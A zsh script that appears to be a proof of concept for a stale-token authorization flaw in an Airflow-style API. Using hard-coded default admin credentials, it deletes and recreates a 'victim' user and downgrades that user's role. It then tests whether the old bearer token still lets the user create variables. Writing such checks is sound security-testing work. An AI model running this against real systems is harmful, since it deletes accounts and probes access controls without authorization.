#!/bin/zsh
set -u
H=$1
adm() { curl -s -X POST $H/auth/token -H 'Content-Type: application/json' -d '{"username":"admin","password":"adminpass"}' | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])"; }
AT=$(adm)
curl -s -o /dev/null -X DELETE -H "Authorization: Bearer $AT" $H/auth/fab/v1/users/victim
curl -s -o /dev/null -X POST -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users \
  -d '{"username":"victim","password":"victimpass","email":"v@x.com","first_name":"v","last_name":"v","roles":[{"name":"Op"}]}'
VT=$(curl -s -X POST $H/auth/token -H 'Content-Type: application/json' -d '{"username":"victim","password":"victimpass"}' | python3 -c "import json,sys;print(json.load(sys.stdin)['access_token'])")
S=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $VT" -H 'Content-Type: application/json' $H/api/v2/variables -d '{"key":"a1_src","value":"1","description":""}')
TR=$(curl -s -o /dev/null -w "%{http_code}" -X PATCH -H "Authorization: Bearer $AT" -H 'Content-Type: application/json' $H/auth/fab/v1/users/victim -d '{"roles":[{"name":"Viewer"}]}')
ROLES=$(curl -s -H "Authorization: Bearer $AT" $H/auth/fab/v1/users/victim | python3 -c "import json,sys;d=json.load(sys.stdin);print([r['name'] for r in d.get('roles') or []], 'active=',d.get('active'))")
F=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $VT" -H 'Content-Type: application/json' $H/api/v2/variables -d '{"key":"a1_follow","value":"1","description":""}')
NT=$(curl -s -X POST $H/auth/token -H 'Content-Type: application/json' -d '{"username":"victim","password":"victimpass"}' | python3 -c "import json,sys;print(json.load(sys.stdin).get('access_token',''))")
D=$(curl -s -o /dev/null -w "%{http_code}" -X POST -H "Authorization: Bearer $NT" -H 'Content-Type: application/json' $H/api/v2/variables -d '{"key":"a1_fresh","value":"1","description":""}')
print -r -- "source POST /api/v2/variables (Op, stale token)      : $S"
print -r -- "transition PATCH users/victim roles=[Viewer]          : $TR   -> $ROLES"
print -r -- "follow-up POST /api/v2/variables (same stale token)   : $F"
print -r -- "D1 fresh login then same POST                         : $D"
